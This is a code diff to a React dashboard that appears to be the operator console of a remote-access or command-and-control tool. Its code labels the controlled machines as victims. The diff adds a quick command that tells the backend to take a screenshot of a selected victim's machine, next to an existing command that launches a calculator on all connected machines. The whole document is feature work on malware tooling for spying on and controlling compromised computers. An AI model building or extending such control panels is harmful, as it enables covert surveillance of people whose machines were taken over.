@@ -54,6 +54,16 @@ export default function Dashboard() {
     fetch(`${API_BASE}/send-calc`, { method: "POST" });
   };
 
+  const handleScreenshot = (e) => {
+    e.preventDefault();
+    if (!selectedVictim) return; // no victim selected, do nothing
+    fetch(`${API_BASE}/send_screenshot`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ victim_id: selectedVictim }),
+    });
+  };
+
   return (
     <div style={styles.container}>
       {/* Sidebar */}
@@ -102,6 +112,7 @@ export default function Dashboard() {
             onChange={(e) => {
               const val = e.target.value;
               if (val === "startCalc") handleBroadcastCalc();
+              if (val === "startScreenshot") handleScreenshot(e);
               // add more commands here
               e.target.value = ""; // reset back to Quick Commands  
             }}
@@ -110,6 +121,7 @@ export default function Dashboard() {
               Quick Commands
             </option>
             <option value="startCalc">Start Calculator (All)</option>
+            <option value="startScreenshot">Take Screenshot ({selectedVictim || "No victim selected"})</option>
             {/* add more options here */}
           </select>
 
